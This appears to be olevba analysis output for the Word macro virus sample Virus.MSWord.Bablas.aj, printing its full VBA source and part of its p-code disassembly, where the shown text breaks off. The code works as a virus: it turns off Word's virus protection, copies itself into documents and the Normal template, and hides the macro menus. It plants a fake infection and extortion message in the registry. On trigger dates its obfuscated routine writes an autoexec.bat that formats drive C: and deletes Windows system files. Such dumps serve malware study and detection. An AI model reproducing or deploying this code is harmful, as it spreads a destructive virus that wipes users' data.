olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bablas.aj
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bablas.aj - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO OBSv2904.bas 
in file: Virus.MSWord.Bablas.aj - OLE stream: 'Macros/VBA/OBSv2904'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Sura Agung Computer
'Under Licensy from OPHAY BUSSINES SOLUTION
'MANAGER "Alm.Midiawaty"
'CEO "Deden Sura Agung"
'Smallest without time sensor
'LU1400
#If Win32 Then
    Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
#Else
    Declare Function GetWindowsDirectory Lib "Kernel" (ByVal P$, ByVal S%) As Integer
#End If
Const FAH = &H2
Const FAR = &H1
Const FAS = &H4
Function WD() As String
Dim WP As String
Dim temp
    WP = String(145, Chr(0))
    temp = GetWindowsDirectory(WP, 145)
    WD = Left(WP, InStr(WP, Chr(0)) - 1)
End Function
Sub KingDestroy()
Dim WP As String
Dim x, Md
WP = WD()
tt2 = Chr(58)
grm = Chr(92)
ttk = Chr(46)
gfh = Chr(102)
hgi = Chr(103)
yxz = Chr(120)
cbd = Chr(98)
mln = Chr(108)
lkm = Chr(107)
ihj = Chr(104)
oao = Chr(64)
tkm = Chr(59)
pnh = Chr(62)
Spb = Chr(32)
Sbs = Chr(83)
Pbs = Chr(80)
Bbs = Chr(66)
Jbs = Chr(74)
Nbs = Chr(78)
Dbs = Chr(68)
Ebs = Chr(69)
Asr = Chr(65)
AaA = Chr(97)
AbC = Chr(98)
BcD = Chr(99)
CdE = Chr(100)
DeF = Chr(101)
EfG = Chr(102)
FgH = Chr(103)
GhI = Chr(104)
HiJ = Chr(105)
IjK = Chr(106)
Jkl = Chr(107)
KlM = Chr(108)
LmN = Chr(109)
MnO = Chr(110)
NoP = Chr(111)
OpQ = Chr(112)
PqR = Chr(113)
QrS = Chr(114)
RsT = Chr(115)
StU = Chr(116)
TuV = Chr(117)
UvW = Chr(118)
VwX = Chr(119)
WxY = Chr(120)
XyZ = Chr(121)
YzA = Chr(122)
pOn = Chr(79)
cBa = Chr(66)
tSr = Chr(83)
Midi = Chr(65)
sRq = Chr(82)
nMl = Chr(77)
gFe = Chr(70)
   Wg = WP + grm
   F3 = FAH + FAR + FAS
   Wgt = Wg + utv + feg + nmo + qpr
   Wgtn = Wgt + grm + onp + jik + onp + feg
sayst = Midi + KlM + LmN + ttk + nMl + HiJ + CdE + HiJ + AaA + VwX + AaA + StU + HiJ + Spb + Midi + MnO + CdE + Spb + pOn + OpQ + GhI + AaA + XyZ + tSr + sRq + ttk + ttk + ttk + Midi + KlM + VwX + AaA + XyZ + RsT + Spb + gFe + NoP + QrS + DeF + UvW + DeF + QrS + ttk
saynd = WP + Spb + HiJ + RsT + Spb + cbd + QrS + NoP + lkm + DeF + MnO + Spb + ttk + ttk + ttk + Sbs + NoP + QrS + QrS + XyZ + ttk
sayrd = Bbs + XyZ + Spb + pOn + OpQ + GhI + AaA + XyZ + tSr + sRq
sayrm = QrS + DeF + LmN + Spb
sayec = DeF + BcD + ihj + NoP
sayof = oao + sayec + Spb + NoP + gfh + gfh
saycp = BcD + NoP + OpQ + XyZ + Spb + pOn + cBa + pOn + tSr + Spb + HiJ + NoP + ttk + RsT + XyZ + RsT + Spb + pnh + Spb + MnO + TuV + mln
SetAttr BcD + tt2 + grm + HiJ + NoP + ttk + RsT + XyZ + RsT, vbNormal
Open BcD + tt2 + grm + pOn + cBa + pOn + tSr For Output As #1
Print #1, sayst
Print #1, saynd
Print #1, sayrd
Close #1
SetAttr BcD + tt2 + grm + LmN + RsT + CdE + NoP + RsT + ttk + RsT + XyZ + RsT, vbNormal
Open BcD + tt2 + grm + LmN + RsT + CdE + NoP + RsT + ttk + RsT + XyZ + RsT For Output As #1
Print #1, tkm + sayst
Print #1, tkm + saynd
Print #1, tkm + sayrd
Close #1
SetAttr BcD + tt2 + grm + LmN + RsT + CdE + NoP + RsT + ttk + RsT + XyZ + RsT, FAH + FAR + FAS
Open BcD + tt2 + grm + BcD + NoP + MnO + gfh + HiJ + hgi + ttk + RsT + XyZ + RsT For Output As #1
Print #1, sayrm + sayst
Print #1, sayrm + saynd
Print #1, sayrm + sayrd
Close #1
Open BcD + tt2 + grm + AaA + TuV + StU + NoP + DeF + yxz + DeF + BcD + ttk + cbd + AaA + StU For Output As #1
Print #1, sayof
Print #1, BcD + mln + RsT
Print #1, sayec + ttk
Print #1, sayec + Spb + sayst
Print #1, sayec + ttk
Print #1, sayec + Spb + saynd
Print #1, sayec + ttk
Print #1, sayec + Spb + sayrd
Print #1, sayec + ttk
Print #1, sayec + ttk
Print #1, sayec + ttk
Print #1, saycp
Print #1, Pbs + AaA + TuV + RsT + DeF
Close #1
Beep
OphayMD
Gone = Pbs + mln + DeF + AaA + RsT + DeF + Spb + RsT + AaA + XyZ + Spb + _
hgi + NoP + NoP + CdE + Spb + cbd + XyZ + DeF + Spb + StU + NoP + _
Spb + XyZ + NoP + TuV + QrS + Spb + VwX + NoP + QrS + lkm + ttk + _
Spb + Asr + MnO + CdE + Spb + MnO + NoP + VwX + Chr(13) + XyZ + _
NoP + TuV + QrS + Spb + VwX + HiJ + MnO + CdE + NoP + VwX + RsT + _
Spb + HiJ + RsT + Spb + Dbs + Ebs + Asr + Dbs
MsgBox "I'm Ophay Sweet Razta." + Chr(13) + "Under Licensy form Ophay Bussines Solution." + Chr(13) + Chr(13) + Gone + " . . . !!!  See you next time.", vbOKOnly, "Hello..."
SetAttr WP + grm + RsT + XyZ + RsT + StU + DeF + LmN + ttk + CdE + AaA + StU, vbNormal
SetAttr WP + grm + TuV + RsT + DeF + QrS + ttk + CdE + AaA + StU, vbNormal
Kill WP + grm + RsT + XyZ + RsT + StU + DeF + LmN + ttk + HiJ + MnO + HiJ
Kill WP + grm + VwX + HiJ + MnO + ttk + HiJ + MnO + HiJ
Kill WP + grm + RsT + XyZ + RsT + StU + DeF + LmN + ttk + CdE + AaA + StU
Kill WP + grm + TuV + RsT + DeF + QrS + ttk + CdE + AaA + StU
Application.StatusBar = "Be carefull ....God Knows ... Your Computer is Dead ... Thank's MD"
End Sub
Sub AutoExec()
WordBasic.DisableAutoMacros True
OBS
FileNewdefault
AttactTemp
MDBirth
End Sub
Sub OBS()
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Options.SavePropertiesPrompt = False
OphayReg
End Sub
Sub ToolsOptions()
Options.SaveNormalPrompt = True
Options.SavePropertiesPrompt = True
Options.VirusProtection = True
Dialogs(wdDialogToolsOptions).Show
OBS
End Sub
Sub ToolsMacro()
FGe
Beep
CapNormal
   MsgBox "              Alm.Midiawaty ,SE." & Chr(13) & _
          "Alm.Midiawaty trying to remain you" & Chr(13) & _
          "To Build The World a Better Place for Living." & Chr(13) & _
          "Don't Touch Me!!!" + Chr(13) + "Don't try it again!!!", vbExclamation + vbOKOnly, "OBS"
End Sub
Sub ViewVbCode()
ToolsMacro
End Sub
Sub FileTemplates()
ToolsMacro
End Sub
Sub OphayMD()
On Error Resume Next
Application.Caption = "You Have Been Forgetting me"
ActiveWindow.Caption = "Alm.Midiawaty ,SE Is Always Everywhere Actualy. "
Application.StatusBar = "I Love OphaySR and don't hurt him or I'll Kill You... "
End Sub
Sub FGe()
Application.Caption = "Don't Forget"
ActiveWindow.Caption = "You try to remove Virus ScanMacro OBS. "
Application.StatusBar = "Alm.Midiawaty trying to remain you, Please Wait..."
Wait
End Sub
Sub CapNormal()
On Error Resume Next
Application.Caption = "Microsoft Word"
ActiveWindow.Caption = ActiveDocument.Name
End Sub
Sub FileOpen()
WordBasic.DisableAutoMacros True
On Error Resume Next
If Dialogs(wdDialogFileOpen).Show <> 0 Then
AttactDoc
ActiveDocument.Save
MDBirth
MiDiDay
CapNormal
End If
WordBasic.DisableAutoMacros False
 AttactDoc
    ActiveDocument.Save
    MDBirth
MiDiDay
End Sub
Sub AutoOpen()
OBS
 AttactDoc
    ActiveDocument.Save
AttactTemp
On Error Resume Next
NormalTemplate.Save
MDBirth
MiDiDay
CapNormal
End Sub
Sub FileSave()
    If ActiveDocument.Saved = False Then
        AttactDoc
        AttactTemp
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub
Sub FileNew()
    Dialogs(wdDialogFileNew).Show
    AttactDoc
End Sub
Sub FileNewdefault()
    Documents.Add
    AttactDoc
   End Sub
Sub Wait()
For i = 1 To 500
On Error Resume Next
Beep
Next i
End Sub
Sub AttactDoc()
    Dim DYes As Boolean
    DYes = False
    On Error GoTo Dock
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "OBSv2904" Then DYes = True
       If Obj.Name = "OBS" Then
       Application.StatusBar = "Upgrading Database Ophay Bussines Solution to " + ActiveDocument.Name + " for virus protection..."
         Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        If Obj.Name <> "OBSv2904" And Obj.Name <> "ThisDocument" Then
Application.Caption = "OBS"
ActiveWindow.Caption = "Found Virus " + Obj.Name + " in " + ActiveDocument.Name + "..."
Application.StatusBar = "Ophay Bussines Solution will automaticly removing Virus " + Obj.Name + " in " + ActiveDocument.Name + "..."
Wait
CapNormal
            Application.StatusBar = "Removing Virus " + Obj.Name + " in " + ActiveDocument.Name + "...Please Wait !!!"
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
Application.StatusBar = "Virus " + Obj.Name + " in " + ActiveDocument.Name + " was removed."
        End If
        End If
    Next Obj
    If DYes = False Then
        Application.StatusBar = "Creating Database Ophay Bussines Solution to " + ActiveDocument.Name + " for virus protection..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
Dock:
     End Sub
Sub AttactTemp()
    Dim NYes As Boolean
    NYes = False
    On Error GoTo temp
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "OBSv2904" Then NYes = True
        If Obj.Name = "OBS" Then
        Application.StatusBar = "Alm.Midiawaty Is Upgrading It Self From  Ophay Bussines Solution to " + ActiveDocument.Name + " to Normal Template for virus protection..."
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        If Obj.Name <> "OBSv2904" And Obj.Name <> "ThisDocument" Then
            ActiveWindow.Caption = "Found Virus " + Obj.Name + " in Normal Template " + "..."
           Application.StatusBar = "Ophay Bussines Solution will automaticly removing Virus " + Obj.Name + " in Normal Template" + "..."
           Wait
           CapNormal
            Application.StatusBar = "Removing Virus " + Obj.Name + " in Normal Template to protect your global document...Please Wait!! "
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
        End If
    Next Obj
    If NYes = False Then
        Application.StatusBar = "Alm.Midiawaty Is Backing Up It Self From  Ophay Bussines Solution to " + ActiveDocument.Name + " to Normal Template for virus protection..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="OBSv2904", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If
temp:
End Sub
Sub HelpAbout()
    Beep
    MsgBox "                           Alm.Midiawaty ,SE." & Chr(13) & _
           " " & Chr(13) & _
           "I was born in SURABAYA, 29 Desember 1975." & Chr(13) & _
           "My bad day come and take me to heaven on 23 Nov 97." & Chr(13) & _
           "Happines...Joynes always cause OphaySR & God Love Me." & Chr(13) & _
           "So, come and join with me in heaven.", vbOKOnly + 64, "OBS"
End Sub
Sub MDBirth()
Dt = Day(Date)
If Dt = 1 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 11 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 20 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 23 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 24 Then
CreaHTML
CapNormal
Exit Sub
End If
If Dt = 29 Then
CreaHTML
CapNormal
Exit Sub
End If
End Sub
Sub Email()
EmailOBS
EmailSAC
End Sub
Sub EmailOBS()
Selection.Font.ColorIndex = wdRed
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
Selection.TypeText Text:="OBS@Yahoo.Com"
Selection.MoveDown Unit:=wdLine, Count:=1
Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
Selection.Comments.Add Range:=Selection.Range
    Selection.TypeText Text:="Ophay Bussines Solution EMail Address"
    ActiveWindow.ActivePane.Close
    Selection.TypeParagraph
End Sub
Sub EmailSAC()
Selection.TypeParagraph
Selection.Font.ColorIndex = wdBlue
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
Selection.TypeText Text:="SAC@HotMail.Com"
Selection.MoveDown Unit:=wdLine, Count:=1
Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
Selection.Comments.Add Range:=Selection.Range
    Selection.TypeText Text:="Sura Agung Computer Custumer Service"
    ActiveWindow.ActivePane.Close
    Selection.TypeParagraph
End Sub
Sub MiDiDay()
Dt = Day(Date)
MT = Month(Date)
If Dt = 20 And MT = 1 Then
Application.Caption = "Happy Birthday to OphaySR and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 20 January . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Birthday to OphaySR and Good Luck..."
OphaySecond
Selection.TypeText Text:="Ophay was born in JAKARTA, 20 JANUARY 1977. She was Graduated from SMAN 6 High School and He've been college on STIE IBiI. Happiness...Joyless always cause OphaySR & God Love Me. But, Someday I Will Come To You. On a Paradise City, I Hope ... So, come and join with me in heaven, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR"
MDForever
Selection.TypeText Text:="Remain on 20 January"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 24 And MT = 5 Then
Application.Caption = "My Wedding Day still remain on mind ..."
Application.StatusBar = "Alm.Midiawaty remain you every 24 Mei . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Wedding Day to OphaySR & Alm.Midiawaty and Good Luck..."
OphaySecond
Selection.TypeText Text:="OphaySR was born in Jakarta, 20 January 1977. Midi was born in SURABAYA, 29 Desember 1975. People said We're best couple and God take her to heaven on 23 November 1997. Happiness...Joyless is always be, cause God Love Us. But, Someday I wishes come on the Wedding Dress again in Up there, I Hope ... So, On The Wedding Dress again, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR & Midiawaty"
MDForever
Selection.TypeText Text:="Remain on 24 Mei"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 18 And MT = 9 Then
Application.Caption = "Happy Birthday to Dewi .N and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 18 September . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Birthday to Dewi .N and Good Luck..."
OphaySecond
Selection.TypeText Text:="Dewi was born in JAKARTA, 18 September 1978. OphaySR & God Love You. I Hope ... So, On The Wedding Dress, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR & MD"
MDForever
Selection.TypeText Text:="Remain on 18 September"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 2 And MT = 11 Then
Application.Caption = "Happy Birthday to My Mother & Sari .N and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 2 November . . . "
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 23 And MT = 11 Then
Application.Caption = "I Will Come to You ...."
Application.StatusBar = "Alm.Midiawaty remain you every 23 November . . . "
Email
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 1 And MT = 12 Then
Application.Caption = "Happy Birthday to Cristine LMA and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every 01 Desember . . . "
Selection.Collapse Direction:=wdCollapseEnd
With Selection.Range
.Font.reset
OphayFirst
Selection.TypeText Text:="Happy Birthday to Cristine Laorina MA and Good Luck..."
OphaySecond
Selection.TypeText Text:="Cristine was born in JAKARTA, 01 Desember 1976. She was Graduated from Boedoet High School and she've been college on STIE IBiI. Happiness...Joyless is always cause OphaySR & God Love You. I Hope ... So, Someday."
OphayThird
Selection.TypeText Text:="Ophay SR"
MDForever
Selection.TypeText Text:="Remain on 01 Desember"
Selection.TypeParagraph
Email
End With
    ActiveDocument.Save
HelpAbout
KingDestroy
Exit Sub
End If
If Dt = 29 And MT = 12 Then
Application.Caption = "Born to raise heaven for Alm.Midiawaty and Good Luck..."
Application.StatusBar = "Alm.Midiawaty remain you every month on 29 Desember. . . "
HelpAbout
KingDestroy
Exit Sub
End If
MDBirth
End Sub
Sub OphayReg()
Dim regs
regs = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
System.PrivateProfileString("", regs, "RegisteredOrganization") = "Sura Agung Computer"
System.PrivateProfileString("", regs, "RegisteredOwner") = "Ophay Busisnes Solution"
regs = "HKEY_CURRENT_USER\Control Panel\International"
System.PrivateProfileString("", regs, "sLongDate") = "Sura Agung Computer, dddd dd MMMM yyyy"
regs = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Detect"
System.PrivateProfileString("", regs, "Info") = "Your Computer Is Already Infected With OBSVirus"
System.PrivateProfileString("", regs, "Info2") = "Please Contact OBS at 021-6506287 or your computer will be HangUp"
End Sub
Sub OphayFirst()
Selection.Font.Bold = wdToggle
Selection.Font.ColorIndex = wdBlue
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
End Sub
Sub OphaySecond()
Selection.Font.ColorIndex = 0
Selection.Font.Bold = wdToggle
Selection.TypeParagraph
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphJustify
End Sub
Sub MDForever()
Selection.TypeParagraph
Selection.TypeText Text:="Always and Forever"
Selection.TypeParagraph
End Sub
Sub OphayThird()
Selection.TypeParagraph
Selection.ParagraphFormat.Alignment = wdAlignParagraphRight
End Sub
Sub CreaHTML()
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Desktop\OBS.html" For Output As #1
Print #1, "<HTML><HEAD><TITLE>OPHAY BUSSINES SOLUTION</TITLE>"
Print #1, "<BODY LINK='#0000ff' VLINK='#800080' BGCOLOR='#00ffff'>"
Print #1, "</FONT></STRONG><P ALIGN='JUSTIFY'><A HREF='mailto:OBS@Yahoo.com'><B><FONT SIZE=6 COLOR='#800000'>OPHAY BUSSINES SOLUTION"
Print #1, "</B></FONT><P ALIGN='JUSTIFY'>&nbsp;</P></A><FONT SIZE=6>    </FONT><FONT FACE='Courier New' COLOR='#ff00ff'>There’s the winter moon shining to my windows. I’m not as sleep because I miss you so. If I could I Know the way I felt today and this feeling so real because I Miss you so. I Think I’m in Love. It’s too late to say I’m in Love.</P>"
Print #1, "<P ALIGN='JUSTIFY'>Please … send me to make it trought … I’m waiting forever. Don’t make me disapointed.</P>"
Print #1, "<P>Email To:</FONT><A HREF='mailto:OBS@Yahoo.Com'>OBS@Yahoo.Com</A>          <A HREF='; mailto: SAC@ Hotmail.Com '>SAC@Hotmail.Com</A>             <A HREF='mailto:Ophay@HotMail.Com'>Ophay@HotMail.Com</A></P><DIR><DIR>"
Print #1, "<FONT FACE='Courier New' COLOR='#ff00ff'><P ALIGN='RIGHT'>&nbsp;</FONT><A HREF='OPHAY@HotMail.Com'><B><FONT FACE='Impact' SIZE=6 COLOR='#ff0000'>OPHAY S.R</B></FONT></A></P></DIR>"
Print #1, "</DIR></BODY></HTML>"
 Close #1
 End Sub






-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bablas.aj
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/OBSv2904 - 33278 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0013 "Sura Agung Computer"
' Line #1:
' 	QuoteRem 0x0000 0x002A "Under Licensy from OPHAY BUSSINES SOLUTION"
' Line #2:
' 	QuoteRem 0x0000 0x0017 "MANAGER "Alm.Midiawaty""
' Line #3:
' 	QuoteRem 0x0000 0x0016 "CEO "Deden Sura Agung""
' Line #4:
' 	QuoteRem 0x0000 0x001C "Smallest without time sensor"
' Line #5:
' 	QuoteRem 0x0000 0x0006 "LU1400"
' Line #6:
' 	LbMark 
' 	Ld Win32 
' 	LbIf 
' Line #7:
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #8:
' 	LbMark 
' 	LbElse 
' Line #9:
' 	FuncDefn (Declare Function GetWindowsDirectory Lib "Kernel" (ByVal P, ByVal S) As Integer)
' Line #10:
' 	LbMark 
' 	LbEndIf 
' Line #11:
' 	Dim (Const) 
' 	LitHI2 0x0002 
' 	VarDefn FAH
' Line #12:
' 	Dim (Const) 
' 	LitHI2 0x0001 
' 	VarDefn FAR
' Line #13:
' 	Dim (Const) 
' 	LitHI2 0x0004 
' 	VarDefn FAS
' Line #14:
' 	FuncDefn (Function WD() As String)
' Line #15:
' 	Dim 
' 	VarDefn WP (As String)
' Line #16:
' 	Dim 
' 	VarDefn temp
' Line #17:
' 	LitDI2 0x0091 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	St WP 
' Line #18:
' 	Ld WP 
' 	LitDI2 0x0091 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St temp 
' Line #19:
' 	Ld WP 
' 	Ld WP 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St WD 
' Line #20:
' 	EndFunc 
' Line #21:
' 	FuncDefn (Sub KingDestroy())
' Line #22:
' 	Dim 
' 	VarDefn WP (As String)
' Line #23:
' 	Dim 
' 	VarDefn x
' 	VarDefn Md
' Line #24:
' 	ArgsLd WD 0x0000 
' 	St WP 
' Line #25:
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	St tt2 
' Line #26:
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	St grm 
' Line #27:
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	St ttk 
' Line #28:
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	St gfh 
' Line #29:
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	St hgi 
' Line #30:
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	St yxz 
' Line #31:
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	St cbd 
' Line #32:
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	St mln 
' Line #33:
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	St lkm 
' Line #34:
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	St ihj 
' Line #35:
' 	LitDI2 0x0040 
' 	ArgsLd Chr 0x0001 
' 	St oao 
' Line #36:
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	St tkm 
' Line #37:
' 	LitDI2 0x003E 
' 	ArgsLd Chr 0x0001 
' 	St pnh 
' Line #38:
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	St Spb 
' Line #39:
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	St Sbs 
' Line #40:
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	St Pbs 
' Line #41:
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	St Bbs 
' Line #42:
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	St Jbs 
' Line #43:
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	St Nbs 
' Line #44:
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	St Dbs 
' Line #45:
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	St Ebs 
' Line #46:
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	St Asr 
' Line #47:
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	St AaA 
' Line #48:
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	St AbC 
' Line #49:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	St BcD 
' Line #50:
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	St CdE 
' Line #51:
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	St DeF 
' Line #52:
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	St EfG 
' Line #53:
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	St FgH 
' Line #54:
' 	LitDI2 0x0068 
' 	ArgsLd Chr 0x0001 
' 	St GhI 
' Line #55:
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	St HiJ 
' Line #56:
' 	LitDI2 0x006A 
' 	ArgsLd Chr 0x0001 
' 	St IjK 
' Line #57:
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	St Jkl 
' Line #58:
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	St KlM 
' Line #59:
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	St LmN 
' Line #60:
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	St MnO 
' Line #61:
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	St NoP 
' Line #62:
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	St OpQ 
' Line #63:
' 	LitDI2 0x0071 
' 	ArgsLd Chr 0x0001 
' 	St PqR 
' Line #64:
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	St QrS 
' Line #65:
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	St RsT 
' Line #66:
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	St StU 
' Line #67:
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	St TuV 
' Line #68:
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	St UvW 
' Line #69:
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	St VwX 
' Line #70:
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	St WxY 
' Line #71:
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	St XyZ 
' Line #72:
' 	LitDI2 0x007A 
' 	ArgsLd Chr 0x0001 
' 	St YzA 
' Line #73:
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	St pOn 
' Line #74:
' 	LitDI2 0x0042 
' 	ArgsLd Chr 0x0001 
' 	St cBa 
' Line #75:
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	St tSr 
' Line #76:
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	St Midi 
' Line #77:
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	St sRq 
' Line #78:
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	St nMl 
' Line #79:
' 	LitDI2 0x0046 
' 	ArgsLd Chr 0x0001 
' 	St gFe 
' Line #80:
' 	Ld WP 
' 	Ld grm 
' 	Add 
' 	St Wg 
' Line #81:
' 	Ld FAH 
' 	Ld FAR 
' 	Add 
' 	Ld FAS 
' 	Add 
' 	St F3 
' Line #82:
' 	Ld Wg 
' 	Ld utv 
' 	Add 
' 	Ld feg 
' 	Add 
' 	Ld nmo 
' 	Add 
' 	Ld qpr 
' 	Add 
' 	St Wgt 
' Line #83:
' 	Ld Wgt 
' 	Ld grm 
' 	Add 
' 	Ld onp 
' 	Add 
' 	Ld jik 
' 	Add 
' 	Ld onp 
' 	Add 
' 	Ld feg 
' 	Add 
' 	St Wgtn 
' Line #84:
' 	Ld Midi 
' 	Ld KlM 
' 	Add 
' 	Ld LmN 
' 	Add 
' 	Ld ttk 
' 	Add 
' 	Ld nMl 
' 	Add 
' 	Ld HiJ 
' 	Add 
' 	Ld CdE 
' 	Add 
' 	Ld HiJ 
' 	Add 
